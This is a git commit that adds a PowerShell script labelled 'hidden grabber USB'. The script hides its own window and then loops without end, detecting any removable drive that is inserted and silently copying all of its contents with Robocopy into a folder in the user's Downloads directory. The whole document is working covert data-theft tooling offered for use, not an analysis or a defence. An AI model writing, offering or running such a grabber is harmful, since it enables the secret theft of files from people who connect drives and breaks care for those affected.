a4d705e5e2782884784e071cc738bfd6964fe5bf
自由 <46299378+li-berty@users.noreply.github.com>
2023-02-04 22:14:59 +0300

    gusb

---
+++ gusb.ps1
@@ -0,0 +1,27 @@
+# hidden grabber USB
+
+$Signature = @"
+[DllImport("user32.dll")]public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
+"@
+$ShowWindowAsync = Add-Type -MemberDefinition $Signature -Name "Win32ShowWindowAsync" -Namespace Win32Functions -PassThru
+$ShowWindowAsync::ShowWindowAsync((Get-Process -Id $pid).MainWindowHandle, 0)
+
+mkdir "$Env:USERPROFILE\Downloads\USB"
+Set-Location "$Env:USERPROFILE\Downloads\USB"
+while ($true){
+    if ((get-volume | where-Object {$_.drivetype -eq "removable"}).DriveLetter -ne $null) {
+        $Driveletters = (get-volume | where-Object {$_.drivetype -eq "removable"}).DriveLetter
+        $i=0
+        foreach ($drive in $Driveletters) {
+            $DrivePath = (get-psdrive | where-object {$_.Name -eq $DriveLetters[$i]}).Root
+            $Label = (get-volume | where-object {$_.DriveLetter -eq $DriveLetters[$i]}).FileSystemLabel
+            mkdir $Label
+            Robocopy.exe $DrivePath $Label /E  
+            $i++
+        }$i=0
+        Start-Sleep -Seconds 10
+    }
+    else {
+        Start-Sleep -Seconds 5
+    }
+}
